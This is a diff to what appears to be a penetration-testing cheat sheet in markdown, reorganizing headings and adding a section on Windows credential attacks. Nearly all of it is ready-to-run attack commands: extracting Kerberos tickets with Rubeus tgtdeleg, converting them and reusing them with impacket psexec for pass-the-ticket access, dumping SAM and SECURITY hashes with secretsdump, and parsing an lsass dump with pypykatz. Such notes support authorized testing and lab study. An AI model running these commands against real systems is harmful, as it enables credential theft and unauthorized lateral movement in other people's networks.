@@ -120,14 +120,20 @@
 - ``` .\rubeus.exe tgtdeleg /nowrap ```
 - decode the kirbi with base 64 ``` cat {ticket.kirbi} | base64 -d > {ticket.kirbi} ```
 
-# Convert kirbi to ccache
+## Convert kirbi to ccache
 - For linux use
   - ``` kirbi2ccache {xx.kirbi} {xx.ccache} ```
   - ``` impacket-ticketConverter {xx.kirbi} {xx.ccache} ```
 - Set ticket at the begining of the command in linux
   - ``` KRB5CCNAME=ticket.ccache psexec -k -no-pass {domain}/{username}@{dc-domain-ip} ```
 
-# Attacking with SAM (security database manager)
+# Working around with dumps
+## Attacking with SAM (security database manager)
 - usually can be found in old windows
   1. dump them to kali (including sam & system)
   2. impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+
+## lsass.dmp
+- forensics dump 
+- https://github.com/skelsec/pypykatz
+- ``` pypykatz lsa mimidump {file} ``` read detail
